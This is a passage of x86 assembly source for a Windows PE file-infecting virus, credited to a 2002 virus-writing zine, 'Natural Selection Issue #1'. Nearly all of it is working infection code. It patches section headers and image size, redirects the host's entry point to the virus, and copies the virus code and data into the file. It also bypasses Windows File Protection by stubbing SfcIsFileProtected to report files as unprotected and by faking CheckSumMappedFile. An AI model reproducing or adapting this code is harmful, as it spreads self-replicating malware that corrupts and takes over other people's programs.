; ( Infection Finishing ) =====================================================
; =============================================================================

FinishFile  PROC    VD:PTR VX, RD:PTR RX, MAP:DWORD

    ; Set our infection marker
    mov     esi, [VD ]
    mov     edi, [MAP]
    mov     [edi][IMAGE_DOS_HEADER.e_csum],    -1

    ; ESI = VD, EDI = PE, EDX = SECTION
    mov     edx, [esi][VX.SectionEntry          ]
    lea     edx, [edi][edx                      ]
    add     edi, [edi][IMAGE_DOS_HEADER.e_lfanew]
    push    edi

    ; Write all new SECTION fields
    mov     eax, [edx][SECTION.VirtualSize      ]
    cmp     eax, [edx][SECTION.SizeOfRawData    ]
    ja      @F
    mov     eax, [edx][SECTION.SizeOfRawData    ]
@@: DO_API  AlignToVA, eax, [edi][PE.SectionAlignment                     ]
    sub     [edi][PE.SizeOfImage], eax
    DO_API  AlignToVA, [esi][VX.NewSectionSize], [edi][PE.SectionAlignment]
    add     [edi][PE.SizeOfImage], eax

    mov     ebx, [esi][VX.NewSectionSize]
    mov     [edx][SECTION.VirtualSize   ],                 ebx
    mov     [edx][SECTION.SizeOfRawData ],                 ebx
    or      [edx][SECTION.Characteristics], IMAGE_SCN_MEM_READ

    ; Decide what SizeOfX SECTION we're in, subtract and update
    mov     eax, [edx][SECTION.VirtualSize        ]
    cmp     eax, [edx][SECTION.SizeOfRawData      ]
    ja      @F
    mov     eax, [edx][SECTION.SizeOfRawData      ]

@@: lea     ecx, [edi][PE.SizeOfCode              ]
    test    [edx][SECTION.Characteristics],             IMAGE_SCN_CNT_CODE
    jnz     @F
    lea     ecx, [edi][PE.SizeOfInitializedData   ]
    test    [edx][SECTION.Characteristics], IMAGE_SCN_CNT_INITIALIZED_DATA
    jnz     @F
    lea     ecx, [edi][PE.SizeOfUninitializedData ]

@@: DO_API  AlignToVA, eax, [edi][PE.FileAlignment]
    sub     [ecx], eax
    mov     eax, [esi][VX.NewSectionSize          ]
    add     [ecx], eax

    ; Set the new EntryPoint and save the old one
    mov     ebx, [esi][VX.VirusEntryPoint    ]
    push    ebx
    xchg    [edi][PE.AddressOfEntryPoint], ebx
    mov     [esi][VX.HostsEntryPoint],     ebx
    pop     ebx

    ; Write the code section of the virus
    DO_API  ConvertToVA, [MAP],    ebx
    push    esi
    mov     esi, [esi][VX.DeltaOffset]
    lea     esi, [esi][WinMain       ]
    mov     edi, eax
    mov     ecx,        Virus_Code / 4
    rep     movsd
    pop     esi

    ; Write the data section of the virus
    push    esi
    mov     ecx,           Size VX / 4
    rep     movsd
    pop     esi

    ; Do the checksums, one of which is pointing to a junk area
    pop     ebx
    DO_API  tCheckSumMappedFile PTR [esi][VX.pCheckSumMappedFile], [MAP], [esi][VX.NewFileSize], ADDR [esi][VX.SectionEntry], ADDR [ebx][PE.CheckSum]

FinishExit:
    ret
FinishFile  ENDP

; =============================================================================
; ( Align to Boundary ) =======================================================
; =============================================================================

AlignToVA   PROC    VALUE:DWORD, ALIGNER:DWORD

    ; EDX:EAX = VALUE.  Divide by ECX, subtract remainder and add ALIGNER.
    mov     eax, [VALUE  ]
    xor     edx, edx
    mov     ecx, [ALIGNER]
    div     ecx
    or      edx, edx
    mov     eax, [VALUE  ]
    jz      AlignExit
    add     eax, [ALIGNER]

AlignExit:
    sub     eax, edx
    ret
AlignToVA  ENDP

; =============================================================================
; ( Convert RVA to VA ) =======================================================
; =============================================================================

ConvertToVA PROC    MAP:DWORD,    VALUE:DWORD

    mov     esi, [MAP  ]
    mov     edi, [VALUE]
    or      edi,    edi
    jz      ConvertFail

    ; Locate start of SECTION in MAP, prepare for looping through them all
    add     esi, [esi][IMAGE_DOS_HEADER.e_lfanew]
    movzx   ecx, [esi][PE.NumberOfSections      ]
    add      si, [esi][PE.SizeOfOptionalHeader  ]
    adc     esi, PE.Magic

ConvertLoop:
    ; Jump over this section entry if it starts above our RVA
    cmp     [esi][SECTION.VirtualAddress],    edi
    ja      ConvertNext

    ; To find out where the section ends in the file, we need to check the
    ; SizeOfRawData and VirtualSize entries and use the biggest one.  Know
    ; now that TASM and MASM swap the meanings of these entries.  Bitches.
    mov     eax, [esi][SECTION.SizeOfRawData ]
    cmp     eax, [esi][SECTION.VirtualSize   ]
    ja      @F
    mov     eax, [esi][SECTION.VirtualSize   ]
@@: add     eax, [esi][SECTION.VirtualAddress]

    ; Jump over this section entry if it ends below our RVA
    cmp     eax,    edi
    jbe     ConvertNext

    ; Fail if this entry doesn't exist in the file [could be memory only]
    cmp     [esi][SECTION.PointerToRawData], 0
    je      ConvertFail

    ; Convert raw pointer to VA and add our value's pointers offset to it
    mov     eax, [MAP]
    add     eax, [esi][SECTION.PointerToRawData]
    sub     edi, [esi][SECTION.VirtualAddress  ]
    add     eax, edi
    jmp     ConvertExit

ConvertNext:
    add     esi, SIZE SECTION
    loop    ConvertLoop

ConvertFail:
    xor     eax,          eax
ConvertExit:
    ret
ConvertToVA ENDP

; =============================================================================
; ( Alternate SfcIsFileProtected ) ============================================
; =============================================================================

AlternSfc   PROC    A:DWORD, B:DWORD

    ; Alternate SfcIsFileProtected procedure, returns "File Unprotected"
    mov     eax, FALSE
    ret

AlternSfc   ENDP

; =============================================================================
; ( Alternate CheckSumMappedFile ) ============================================
; =============================================================================

AlternSum   PROC    A:DWORD, B:DWORD, Y:DWORD, Z:DWORD

    ; Alternate CheckSumMappedFile procedure, returns "NULL Checksum OK"
    mov     eax,   [Z]
    mov     ebx,  NULL
    xchg    [eax], ebx
    mov     eax,   [Y]
    mov     [eax], ebx
    mov     eax,   [A]
    add     eax, [eax][IMAGE_DOS_HEADER.e_lfanew]
    ret

AlternSum   ENDP

; =============================================================================
; ( Virus Data ) ==============================================================
; =============================================================================

    ALIGN       4
    Virus_Code  EQU $ - WinMain
    Virus_Data  VX { }
    Virus_Size  EQU $ - WinMain

Virus          ENDS
END         WinMain

 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 --------------- (c) 2002 Feathered Serpents )=-
 -=( ---------------------------------------------------------------------- ) `
